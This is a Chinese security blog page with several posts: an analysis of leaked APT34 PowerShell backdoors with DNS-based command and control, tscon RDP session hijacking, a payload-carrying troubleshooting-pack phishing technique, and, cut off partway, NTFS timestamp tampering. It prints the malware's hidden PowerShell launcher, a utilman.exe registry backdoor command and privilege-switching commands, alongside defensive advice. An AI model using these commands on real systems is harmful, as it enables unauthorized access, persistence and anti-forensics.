<p>本文将要介绍以下内容：</p>

<ul>
  <li>对PoisonFrog的分析</li>
  <li>对Glimpse的分析</li>
  <li>小结</li>
</ul>

<h2 id="0x02-对poisonfrog的分析">0x02 对PoisonFrog的分析</h2>
<hr>

<p>对应泄露文件的名称为posion frog</p>

<p>包括两部分文件：</p>

<ul>
  <li>agent，包含文件poisonfrog.ps1，是通过powershell实现的木马程序</li>
  <li>server side，对应木马控制端，使用Node.js开发</li>
</ul>

<h3 id="1agent实现的功能">1、agent实现的功能</h3>

<h4 id="1-在publicpublic文件夹下释放三个文件">1. 在%public%\Public文件夹下释放三个文件</h4>

<ul>
  <li>dUpdater.ps1</li>
  <li>hUpdater.ps1</li>
  <li>UpdateTask.vbs</li>
</ul>

<p>释放文件的具体功能如下：</p>

<p>(1)dUpdater.ps1</p>

<ol>
  <li>生成一个当前系统的专有标志</li>
  <li>读取当前系统的代理设置</li>
  <li>通过HTTP协议从c2服务器下载文件</li>
  <li>根据下载文件的内容进行下一步操作，包括执行命令，上传文件和下载文件</li>
</ol>

<p>(2)hUpdater.ps1</p>

<ol>
  <li>生成一个当前计算机的专有标志</li>
  <li>创建以下文件夹</li>
</ol>

<ul>
  <li>%public%\Public&lt;id&gt;</li>
  <li>%public%\Public&lt;id&gt;\reveivebox</li>
  <li>%public%\Public&lt;id&gt;\sendbox</li>
  <li>%public%\Public&lt;id&gt;\done</li>
</ul>

<ol>
  <li>通过DNS A记录从c2服务器接收控制命令</li>
  <li>执行命令并回传结果</li>
</ol>

<p>(3)UpdateTask.vbs</p>

<p>内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>command0 = "Powershell.exe -exec bypass -file C:\Users\Public\Public\hUpdater.ps1"
set Shell0 = CreateObject("wscript.shell")
shell0.run command0, 0, false
command1 = "Powershell.exe -exec bypass -file C:\Users\Public\Public\dUpdater.ps1"
set Shell1 = CreateObject("wscript.shell")
shell1.run command1, 0, false
</code></pre></div></div>

<p>用来加载powershell脚本dUpdater.ps1和hUpdater.ps1</p>

<h4 id="2-创建两个计划任务">2. 创建两个计划任务</h4>

<ul>
  <li>名称为\UpdateTasks\UpdateTask，每10分钟运行一次，以当前用户权限执行UpdateTask.vbs</li>
  <li>名称为\UpdateTasks\UpdateTaskHosts，每10分钟运行一次，以System权限执行UpdateTask.vbs</li>
</ul>

<h3 id="2-对server-side的分析">2、 对server side的分析</h3>

<p>通过Node.js实现</p>

<p>使用时需要先通过npm安装第三方包，具体安装的命令位于文件install_pachages.bat中</p>

<p>index.js为主体程序</p>

<p>考虑到避免被滥用，控制端的代码不做具体分析，也不提供具体搭建的方法</p>

<p><strong>注：</strong></p>

<p>我在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Node.js-Downloader%E7%9A%84%E5%AE%9E%E7%8E%B0/">《渗透测试中的Node.js——Downloader的实现》</a>和<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Node.js-%E5%88%A9%E7%94%A8C++%E6%8F%92%E4%BB%B6%E9%9A%90%E8%97%8F%E7%9C%9F%E5%AE%9E%E4%BB%A3%E7%A0%81/">《渗透测试中的Node.js——利用C++插件隐藏真实代码》</a>曾介绍过Node.js的使用，Node.js的基础知识可以参考这两篇文章</p>

<p>使用Node.js实现server side有以下优点：</p>

<ul>
  <li>语法简单易懂</li>
  <li>轻量又高效</li>
  <li>可同时部署在Windows和Linux系统</li>
</ul>

<h3 id="3该工具的公开线索">3、该工具的公开线索</h3>

<ol>
  <li>APT34曾利用CVE-2017-11882传播该木马，FireEye对样本进行过分析：</li>
</ol>

<p>https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html</p>

<ol>
  <li>Palo Alto Networks将其命名为Early BondUpdater，对样本的分析资料：</li>
</ol>

<p>https://unit42.paloaltonetworks.com/dns-tunneling-in-the-wild-overview-of-oilrigs-dns-tunneling/</p>

<h2 id="0x03-对glimpse的分析">0x03 对Glimpse的分析</h2>
<hr>

<p>对应泄露文件的名称为Glimpse</p>

<p>包括四部分文件：</p>

<ul>
  <li>Agent，包含四个文件dns.ps1、dns_main.ps1、refineddns_main.ps1和runner_.vbs</li>
  <li>panel，包含一个c#开发的界面程序，是界面化的木马控制端</li>
  <li>server，是Node.js开发的木马控制端</li>
  <li>Read me.txt，配置说明文档</li>
</ul>

<h3 id="1agent实现的功能-1">1、agent实现的功能</h3>

<p>dns.ps1、dns_main.ps1和refineddns_main.ps1三个文件的功能相同</p>

<p>原始版本为dns_main.ps1</p>

<p>dns.ps1和refineddns_main.ps1只是变量名称替换成了无意义的混淆字符串</p>

<p>dns_main.ps1的功能如下：</p>

<ol>
  <li>
    <p>创建文件夹%public%\Libraries</p>
  </li>
  <li>
    <p>判断文件%public%\Libraries\lock是否存在</p>
  </li>
</ol>

<ul>
  <li>如果不存在，创建文件并写入当前powershell进程的pid</li>
  <li>如果文件存在，读取文件创建时间，如果距离现在的时间超过10分钟，那么会退出进程并删除lock文件</li>
</ul>

<ol>
  <li>
    <p>生成一个当前系统的专有标志，写入文件%public%\Libraries\quid</p>
  </li>
  <li>
    <p>创建以下文件夹</p>
  </li>
</ol>

<ul>
  <li>%public%\Libraries\files</li>
  <li>%public%\Libraries&lt;id&gt;</li>
  <li>%public%\Libraries&lt;id&gt;\reveivebox</li>
  <li>%public%\Libraries&lt;id&gt;\sendbox</li>
  <li>%public%\Libraries&lt;id&gt;\done</li>
</ul>

<ol>
  <li>通过DNS A记录或DNS TXT记录从c2服务器接收控制命令</li>
  <li>执行命令并回传结果</li>
</ol>

<h3 id="2-对server的分析">2、 对server的分析</h3>

<p>通过Node.js实现</p>

<p>使用时需要先通过npm安装第三方包，具体安装的命令位于文件Read me.txt中</p>

<p>相比于PoisonFrog，Glimpse在代码结构上做了优化，并且添加了通过DNS TXT记录传输数据的功能</p>

<p>考虑到避免被滥用，控制端的代码不做具体分析，也不提供具体搭建的方法</p>

<h3 id="3该工具的公开线索-1">3、该工具的公开线索</h3>

<ol>
  <li>Palo Alto Networks将其命名为Updated BondUpdater，对样本的分析资料：</li>
</ol>

<p>https://unit42.paloaltonetworks.com/unit42-oilrig-uses-updated-bondupdater-target-middle-eastern-government/</p>

<h2 id="0x04-小结">0x04 小结</h2>
<hr>

<p>对于PoisonFrog和Glimpse，虽然这次泄露了工具源码，但它们早在2017年已经被捕获样本，也被分析的很清楚，个人认为该工具不存在被大规模滥用的隐患。而使用DNS协议传输数据也是一个很古老的方法，个人认为该工具不会导致恶意软件技术的升级。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on April 19, 2019
  </div>

  
</article><article class="post">
  <h1>渗透技巧——利用tscon实现未授权登录远程桌面</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>Windows系统下，tscon可被用来切换远程桌面的会话。正常情况下，切换会话时需要提供登录密码，但通过特殊的利用方法能够绕过验证，不输入密码实现未授权登录。</p>

<p>这会造成什么影响呢？这个方法能用在哪种条件下呢？结合利用方法又该如何防御呢？本文将要一一介绍</p>

<p><strong>注：</strong></p>

<p>本文使用tscon未授权登录的思路借鉴于如下链接:</p>

<p>https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>tscon的正常用法</li>
  <li>利用tscon实现未授权登录远程桌面的方法</li>
  <li>应用实例</li>
  <li>防御建议</li>
</ul>

<h2 id="0x02-tscon的正常用法">0x02 tscon的正常用法</h2>
<hr>

<p>对于开启远程桌面服务的Windows系统，当有多个用户登录该系统时，会产生多个会话，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-17/2-1.png" alt="Alt text"></p>

<p>测试系统： Server2012 R2</p>

<p>用户Administrator为本地登录</p>

<p>用户b为通过远程桌面服务(RDP)连接3389端口远程登录</p>

<p>接下来，如果用户Administrator想要切换至用户b的远程桌面，可通过<code class="language-plaintext highlighter-rouge">右键</code>-<code class="language-plaintext highlighter-rouge">Connect</code>进行连接，接着输入密码即可</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-17/2-2.png" alt="Alt text"></p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-17/2-3.png" alt="Alt text"></p>

<p>tscon是命令行下使用的工具，可实现相同的功能</p>

<p>首先获取用户对应的sessionid，执行如下命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>query user
</code></pre></div></div>

<p>输出如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-17/2-4.png" alt="Alt text"></p>

<p>用户b对应的sessionid为2</p>

<p>通过tscon切换至用户b的桌面，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tscon 2 /PASSWORD:test123!
</code></pre></div></div>

<h2 id="0x03-利用tscon实现未授权登录远程桌面的方法">0x03 利用tscon实现未授权登录远程桌面的方法</h2>
<hr>

<p>在System权限执行同样的命令，就能够绕过输入密码的过程，直接切换</p>

<p>从Admin权限切换到System权限的方法在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8EAdmin%E6%9D%83%E9%99%90%E5%88%87%E6%8D%A2%E5%88%B0System%E6%9D%83%E9%99%90/">《渗透技巧——从Admin权限切换到System权限》</a>有过详细介绍，常用方法有如下三种：</p>

<ul>
  <li>通过创建服务获得System权限</li>
  <li>利用MSIExec获得System权限</li>
  <li>利用token复制获得System权限</li>
</ul>

<p>选取其中的一种，获得system权限，接着输入如下命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tscon 2
</code></pre></div></div>

<p>成功登录</p>

<h2 id="0x04-应用实例一">0x04 应用实例一</h2>
<hr>

<p>对于Server2012 R2系统，默认情况下，通过mimikatz无法导出明文口令，测试环境下，通过某些方法获得了服务器的一个用户名密码，可以通过远程桌面进行登录</p>

<p>登录后发现后台存在另一用户</p>

<p>由于未导出明文口令，通过常规方法无法切换至另一用户的桌面</p>

<p>这里就可以借助上文提到的方法，先提权至System权限，再切换过去</p>

<p><strong>特别的地方：</strong></p>

<p>当用户通过远程桌面登录后，直接点击关闭断开连接，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-17/2-5.png" alt="Alt text"></p>

<p>此时该会话并没有结束，后台显示<code class="language-plaintext highlighter-rouge">Disconnected</code>，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-17/2-6.png" alt="Alt text"></p>

<p>此时，仍能在system权限下通过tscon实现未授权连接</p>

<h2 id="0x05-应用实例二">0x05 应用实例二</h2>
<hr>

<p>利用辅助工具管理器后门(放大镜后门原理相同，进程为sethc.exe)绕过系统登录界面</p>

<p>进程： utilman.exe</p>

<p>登录界面可通过点击图标对其调用，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-17/3-1.png" alt="Alt text"></p>

<p>调用辅助工具管理器的快捷键: Win+U</p>

<p>通过注册表劫持实现后门，修改注册表的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
</code></pre></div></div>

<p>在登录界面启动辅助工具管理器，弹出cmd.exe，权限为system，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-17/3-2.png" alt="Alt text"></p>

<p>通过tscon可直接切换至目标用户的桌面</p>

<p><strong>补充：</strong></p>

<p>在登录界面状态下，降权方法受限，SelectMyParent和Invoke-TokenManipulation.ps1均报错</p>

<p>使用incognito能够成功降权，但是操作仍受限，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-17/3-3.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>SelectMyParent、Invoke-TokenManipulation.ps1和incognito的使用说明可参考文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/">《渗透技巧-Token窃取与利用》</a></p>

<p>无法对目标用户桌面进行截屏，截屏的powershell代码可参考：</p>

<p>https://gallery.technet.microsoft.com/scriptcenter/eeff544a-f690-4f6b-a586-11eea6fc5eb8</p>

<p><strong>受限的原因：</strong></p>

<p>登录界面下，虽然是system权限，但是此时的进程均是winlogon的子进程</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-17/3-4.png" alt="Alt text"></p>

<p><strong>绕过思路：</strong></p>

<p>利用WMI做中转，通过WMI启动进程，默认父进程为<code class="language-plaintext highlighter-rouge">svchost.exe</code>-&gt;<code class="language-plaintext highlighter-rouge">WmiPrvSE.exe</code></p>

<p>命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic process call create commandline = "powershell -ep bypass -f c:\test\system4.ps1"
</code></pre></div></div>

<p>system4.ps1的内容来自于<code class="language-plaintext highlighter-rouge">Invoke-TokenManipulation.ps1</code>，以用户<code class="language-plaintext highlighter-rouge">win-eq8jfsr081d\b</code>的权限执行脚本，具体参数为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-TokenManipulation -CreateProcess "c:\test\task.bat" -Username "in-eq8jfsr081d\b"
</code></pre></div></div>

<p>task.bat的功能为输出环境变量到task.txt中，具体参数为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set &gt;&gt;c:\test\task.txt
</code></pre></div></div>

<p>执行如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-17/3-5.png" alt="Alt text"></p>

<p>查看task.txt的内容，判断环境变量，成功降权，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-17/3-6.png" alt="Alt text"></p>

<p>通过这种方式，可以分别降权至High和Medium权限，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-17/3-7.png" alt="Alt text"></p>

<h2 id="0x06-防御建议">0x06 防御建议</h2>
<hr>

<p>建议用户使用注销用户的方式断开远程桌面，注销后，无法通过tscon获得桌面会话</p>

<p>监控系统用户的登录日志，攻击者需要先远程登录系统后才能做进一步利用：未授权切换桌面会话</p>

<p>对于Windows系统，需要注意攻击者如果获得了系统的访问权限，能够利用放大镜和辅助工具管理器后门实现未授权登录</p>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文介绍了利用tscon实现未授权登录远程桌面的方法，站在攻击者的角度，分析利用思路，最后站在防御的角度，结合攻击方法，给出防御建议。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on January 18, 2018
  </div>

  
</article><article class="post">
  <h1>故障诊断平台在渗透测试中的应用技巧</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>近日，Proofpoint的Matthew Mesa和Axel F发现了一种新型钓鱼方式，攻击者将故障排除包（troubleshooting pack）作为邮件附件，欺骗用户运行，隐蔽执行Payload。他们在文章中介绍了攻击者采用的方法和隐藏手段，提示用户对此提高警惕。</p>

<p><strong>文章链接：</strong></p>

<p>https://www.proofpoint.com/us/threat-insight/post/windows-troubleshooting-platform-leveraged-deliver-malware</p>

<p>本文将站在技术研究的角度，介绍如何开发一个包含payload的故障排除包，并结合攻击思路分析防御方法，希望能帮助大家对这项技术有进一步的认识。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p><strong>Windows故障诊断平台：</strong></p>

<p>英文翻译Windows Troubleshooting Platform，缩写为WTP</p>

<p>开发商可基于该平台编写故障排除包(troubleshooting pack)，帮助用户解决遇到的PC问题</p>

<p>WTP结构如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-13/1-1.png" alt="Alt text"></p>

<p>图片引用自https://msdn.microsoft.com/en-us/library/windows/desktop/dd323706(v=vs.85).aspx</p>

<p>简要流程如下：</p>

<ul>
  <li>
    <p>检查故障排除包的数字签名，如果不可用，直接退出</p>
  </li>
  <li>
    <p>依次执行检测脚本（detection scripts）、解决脚本（resolution scripts）、验证脚本（verification scripts），尝试解决故障</p>
  </li>
  <li>
    <p>生成结果报告和调试报告</p>
  </li>
</ul>

<p><strong>故障排除包：</strong></p>

<p>由五个组件构成：</p>

<ul>
  <li>
    <p>故障排除清单（Troubleshooting manifest）</p>
  </li>
  <li>
    <p>检测脚本（detection scripts）</p>
  </li>
  <li>
    <p>解决脚本（resolution scripts）</p>
  </li>
  <li>
    <p>验证脚本（verification scripts）</p>
  </li>
  <li>
    <p>本地化资源（localized resources）</p>
  </li>
</ul>

<p>详情如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-13/2-1.png" alt="Alt text"></p>

<p>引用自https://msdn.microsoft.com/en-us/library/windows/desktop/dd323706(v=vs.85).aspx</p>

<h2 id="0x02-开发故障排除包">0x02 开发故障排除包</h2>
<hr>

<p>官方开发工具：</p>

<p><code class="language-plaintext highlighter-rouge">TSPDesigner</code></p>

<p><strong>注：</strong></p>

<p>该工具包含于Windows 7 SDK中</p>

<p>实际测试只有v7.0和v7.1包含此工具</p>

<p>Windows 7 SDK version 7.0需要搭配.NET Framework 3.5 SP1，下载地址如下：</p>

<p>https://www.microsoft.com/en-us/download/details.aspx?id=3138</p>

<p>Windows 7 SDK version 7.1需要搭配.NET Framework 4，下载地址如下：</p>

<p>https://www.microsoft.com/en-us/download/details.aspx?id=8279</p>

<p>TSPDesigner位于默认目录<code class="language-plaintext highlighter-rouge">C:\Program Files\Microsoft SDKs\Windows\v7.1\Bin\TSPDesigner</code>下，包含以下内容：</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-13/2-2.png" alt="Alt text"></p>

<p>详细开发介绍可参照：</p>

<p>https://msdn.microsoft.com/en-us/library/windows/desktop/dd323712(v=vs.85).aspx</p>

<p>下面实例演示如何通过TSPDesigner生成测试故障排除包</p>

<h3 id="1设置属性也就是故障包的第一页">1.设置属性，也就是故障包的第一页</h3>

<p>Project Name: testwtp</p>

<p>Project Description: troubleshooting pack test</p>

<p>Privacy URL: https://3gstudent.github.io/</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-13/2-3.png" alt="Alt text"></p>

<h3 id="2添加root-cause点击add-new-root-cause设置故障信息">2.添加root cause，点击Add New Root Cause，设置故障信息</h3>

<p>Root Cause ID: ServiceIsStopped</p>

<p>Root Cause Name: The service is stopped.</p>

<p>Root Cause Description: The service is stopped.You need enable it.</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-13/2-4.png" alt="Alt text"></p>

<h3 id="3设置troubleshooter">3.设置Troubleshooter</h3>

<p>如图，指定需要提升权限，关闭交互</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-13/2-5.png" alt="Alt text"></p>

<h3 id="4设置resolver">4.设置Resolver</h3>

<p>Resolver Name: StartTheService</p>

<p>Resolver Description: Start the service.</p>

<p>Prompt the User: No</p>

<p>Elevation: Yes</p>

<p>Interactions: No</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-13/2-6.png" alt="Alt text"></p>

<p>指定需要提升权限，关闭用户警告，关闭交互</p>

<h3 id="5设置verifier">5.设置Verifier</h3>

<p>选择No，不需要确定故障被解决</p>

<h3 id="6设置scripts">6.设置Scripts</h3>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-13/2-7.png" alt="Alt text"></p>

<p><strong>注：</strong>
由于在步骤3、4指定了提升权限，所以此处的Troubleshooter Script和Resolver Script已经具有管理员权限</p>

<p>可在此处添加payload</p>

<h3 id="7设置数字签名">7.设置数字签名</h3>

<p>选择Project-Options，找到Code Signing</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-13/2-8.png" alt="Alt text"></p>

<p>可选择使用Test Certificate或是指定一个证书</p>

<p>测试默认选择<code class="language-plaintext highlighter-rouge">Use Generated Test Certificate</code></p>

<h3 id="8生成">8.生成</h3>

<p>选择Build-Build Pack</p>

<p>生成如下文件：</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-13/2-9.png" alt="Alt text"></p>

<p>1.</p>

<p>TS_ServiceIsStopped.ps1对应Troubleshooter Script</p>

<p>RS_ServiceIsStopped.ps1对应Resolver Script</p>

<p><strong>注：</strong></p>

<p>查看这两个ps脚本可以发现其中包含的payload</p>

<p>2.</p>

<p>testwtp.diagpkg为清单文件，包含troubleshooting pack中的参数，格式为xml，具体语法可参考：</p>

<p>https://msdn.microsoft.com/en-us/library/windows/desktop/dd323781(v=vs.85).aspx</p>

<p>3.</p>

<p>DiagPackage.cat保存该troubleshooting pack的数字签名</p>

<p><strong>注：</strong></p>

<p>DiagPackage.cat文件中的数字签名可通过双击查看</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-13/3-1.png" alt="Alt text"></p>

<p>4.</p>

<p>cab目录下的testwtp.diagcab为封装好的troubleshooting pack，包含以上文件的信息</p>

<p>如图，运行过程中执行payload，弹出管理员权限的cmd.exe</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-13/3-2.png" alt="Alt text"></p>

<h2 id="0x03-测试运行故障排除包">0x03 测试运行故障排除包</h2>
<hr>

<p>将生成的.diagcab文件放到另一个测试系统</p>

<p>报错，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-13/3-3.png" alt="Alt text"></p>

<p>这是由于使用的默认Test Certificate在新系统无法被识别，可在TSPDesigner同级目录下找到证书文件<code class="language-plaintext highlighter-rouge">TestWindowsTroubleShooting.cer</code>，安装至受信任的根证书颁发机构，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-13/3-4.png" alt="Alt text"></p>

<p>数字签名成功识别，如下图</p>

<p><strong>注：</strong></p>

<p>此处显示的发布者名称对应签名证书使用的颁发者，为<code class="language-plaintext highlighter-rouge">TestCertforWindowsTroubleShooting</code></p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-13/3-5.png" alt="Alt text"></p>

<p>当然，如果使用一个默认可信的证书，那么该故障排除包默认被信任，可直接运行</p>

<p>点击隐私声明，弹出步骤1中设置的Privacy URL：https://3gstudent.github.io/</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-13/3-6.png" alt="Alt text"></p>

<p>至此，成功实现测试故障排除包</p>
<h2 id="0x04-小结">0x04 小结</h2>
<hr>

<p>在渗透测试中，使用troubleshooting pack有如下好处：</p>

<ul>
  <li>
    <p>更加隐蔽，.diagcab文件不常见</p>
  </li>
  <li>
    <p>更具欺骗性，用户往往对故障排除功能失去警惕</p>
  </li>
  <li>
    <p>可直接获得管理员权限</p>
  </li>
  <li>
    <p>内嵌钓鱼页面，可指定隐私声明的链接</p>
  </li>
</ul>

<p><strong>防御建议：</strong></p>

<p>微软在一开始就已经注意到了这个问题，所以为troubleshooting pack添加了数字签名验证，所以当遇到troubleshooting pack时（比如某个操作触发了故障修复），首先要对发布者的身份进行判断。</p>

<p><strong>注：</strong></p>

<p>微软提供的troubleshooting pack中发布者名称默认为Microsoft Corporation</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on October 13, 2016
  </div>

  
</article><article class="post">
  <h1>渗透技巧——Windows下NTFS文件的时间属性</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在渗透测试中，如果需要在目标系统上释放文件，将会改变父目录的时间属性(AccessTime,LastWriteTime,MFTChangeTime)，如果需要覆盖目标系统上原有的文件，也会改变原有文件的时间属性(CreateTime,AccessTime,LastWriteTime,MFTChangeTime)</p>

<p>站在渗透的角度，需要找到修改文件时间属性的方法，用来消除痕迹</p>

<p>站在取证的角度，通过文件属性的异常能够找到攻击者的入侵痕迹</p>

<p>本文将会介绍修改文件属性的方法和细节，分享实现代码，结合利用思路给出在取证上的建议</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>基本概念</li>
  <li>读取文件属性的方法</li>
  <li>修改文件属性的方法</li>
  <li>分享代码</li>
  <li>利用思路</li>
  <li>取证建议</li>
</ul>

<h2 id="0x02-基本概念">0x02 基本概念</h2>
<hr>

<h3 id="1ntfs文件系统中的时间属性">1、NTFS文件系统中的时间属性</h3>

<p>包括以下四个：</p>

<ul>
  <li>CreateTime(Created)</li>
  <li>AccessTime(Accessed)</li>
  <li>LastWriteTime(Modified)</li>
  <li>MFTChangeTime</li>
</ul>

<p>前三个可通过<code class="language-plaintext highlighter-rouge">右键</code>-&gt;<code class="language-plaintext highlighter-rouge">Properties</code>获得，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-18/5-1.png" alt="Alt text"></p>

<p>无法直接查看MFTChangeTime</p>

<p>MFTChangeTime记录MFT(Master File Table)的修改时间，如果文件属性变化，就会更新MFTChangeTime</p>

<h3 id="2读取mftchangetime的方法">2、读取MFTChangeTime的方法</h3>

<h4 id="1通过ntqueryinformationfile读取">(1)通过NtQueryInformationFile读取</h4>

<p><strong>注：</strong></p>

<p>通过WinAPI GetFileTime无法获得</p>

<h4 id="2解析ntfs文件格式">(2)解析NTFS文件格式</h4>

<p>Master File Table中的<code class="language-plaintext highlighter-rouge">$STANDARD_INFORMATION</code>(偏移0x10)和<code class="language-plaintext highlighter-rouge">$FILE_NAME</code>(偏移0x30)包含完整的文件属性</p>

<h3 id="3win7系统默认createtime和accesstime保持一致">3、Win7系统默认CreateTime和AccessTime保持一致</h3>

<p>Win7系统(以及更高版本)默认设置下，禁用了AccessTime的更新</p>

<p>也就是说，只读取文件的操作不会改变文件属性AccessTime，AccessTime同CreateTime保持一致，这是为了减少硬盘的读写</p>

<p>对应注册表位置<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem</code>，键值<code class="language-plaintext highlighter-rouge">NtfsDisableLastAccessUpdate</code></p>

<p>数值<code class="language-plaintext highlighter-rouge">1</code>代表禁用，为默认配置，数值<code class="language-plaintext highlighter-rouge">0</code>代表开启，修改注册表后重启系统才能生效</p>

<h3 id="4文件属性的变化规律">4、文件属性的变化规律</h3>

<p>读取文件：</p>

<p>不会改变文件属性</p>

<p>覆盖文件：</p>

<p>改变4个属性</p>

<h3 id="5文件夹属性的变化规律">5、文件夹属性的变化规律</h3>

<p>新建文件/删除文件/重命名文件：</p>

<p>改变父文件夹的AccessTime，LastWriteTime和MFTChangeTime</p>

<p>读取文件：</p>

<p>不会改变文件属性</p>

<p>覆盖文件：</p>

<p>不会改变文件属性</p>

<p><strong>注：</strong></p>

<p>可借助SetMace进行测试，下载地址：</p>

<p>https://github.com/jschicht/SetMace</p>

<h2 id="0x03-读取和修改文件属性的方法">0x03 读取和修改文件属性的方法</h2>
<hr>

<h3 id="1使用winapi-getfiletime和setfiletime">1、使用WinAPI GetFileTime和SetFileTime</h3>

<p>能够操作三个文件属性：</p>

<ul>
  <li>CreateTime(Created)</li>
  <li>AccessTime(Accessed)</li>
  <li>LastWriteTime(Modified)</li>
</ul>

<p>无法对MFTChangeTime进行操作</p>

<h4 id="1getfiletime的使用">(1)GetFileTime的使用</h4>

<p>通过<code class="language-plaintext highlighter-rouge">GetFileTime()</code>获得FileTime</p>

<p>通过<code class="language-plaintext highlighter-rouge">FileTimeToSystemTime()</code>将FileTime转换为SystemTime，即UTC，同一标准</p>

<p>通过<code class="language-plaintext highlighter-rouge">SystemTimeToTzSpecificLocalTime()</code>将SystemTime转换为LocalTime，即UTC加上时区，考虑时区的影响，同当前系统显示的时间保持一致</p>

<h4 id="2setfiletime的使用">(2)SetFileTime的使用</h4>

<p>通过<code class="language-plaintext highlighter-rouge">sscanf()</code>将输入的时间数据转换为SystemTime</p>

<p>通过<code class="language-plaintext highlighter-rouge">SystemTimeToFileTime()</code>将SystemTime转换为FileTime</p>

<p>通过<code class="language-plaintext highlighter-rouge">LocalFileTimeToFileTime()</code>将FileTime转换为对应UTC的FILETIME，即FILETIME加上时区，考虑时区的影响，同当前系统显示的时间保持一致</p>

<p>实现代码已开源，下载地址：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/FileTimeControl_WinAPI.cpp</p>

<p>代码实现了以下功能：</p>

<ul>
  <li>查看文件/文件夹的时间(CreateTime,AccessTime,LastWriteTime)</li>
  <li>修改文件/文件夹的时间</li>
